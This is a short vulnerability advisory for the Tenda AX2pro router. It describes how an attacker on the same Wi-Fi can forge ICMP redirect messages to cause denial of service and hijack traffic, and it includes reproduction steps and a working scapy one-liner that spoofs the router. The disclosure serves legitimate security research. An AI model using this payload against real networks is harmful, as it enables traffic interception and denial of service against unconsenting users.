### Description
The Tenda AX2pro router is vulnerable to forged ICMP redirect message attacks. An attacker in the same WLAN as the victim can easily forge ICMP redirect message to organize DoS and hijack traffic between the victim and the server.

### Environment
- The attack device is in Windows 11. The victim device is in another Windows' WSL Ubuntu 22.04 TLS.
- The router is Tenda AX2pro with firmware version V16.03.29.48_cn.

### Reproduction
1. Before attack, the victim and the attacker should be in the same WIFI. For example, the victim's IP is `192.168.0.186`, the attacker's IP is `192.168.0.107`, the router IP is `192.168.0.1`.
2. Now the victim can success to ping `8.8.8.8`. Run `ip route get 8.8.8.8` to see the normal routing `192.168.0.1`.
3. When the victim pings server, the attacker takes the scapy to send forged ICMP redirect message, which forges to be router sending redirect message telling the victim to redirect to the attacker's IP to the victim. The attacker can manage it by running code:
```
send(IP(src = "192.168.0.1", dst = "192.168.0.186") / ICMP(type = 5, code = 1, gw = "192.168.0.107") / IP(src = "192.168.0.186", dst = "8.8.8.8") / ICMP(type = 0, code = 0))
```
4. Then the attack carried out successfully. The ping will breakdown and the victim's routing will be redirected to the attacker's IP, then the attacker can hijack the traffic between the victim and the server.

### Credit
Keyun Luo, Ke Xu, Xuewei Feng, Qi Li, Yuxiang Yang
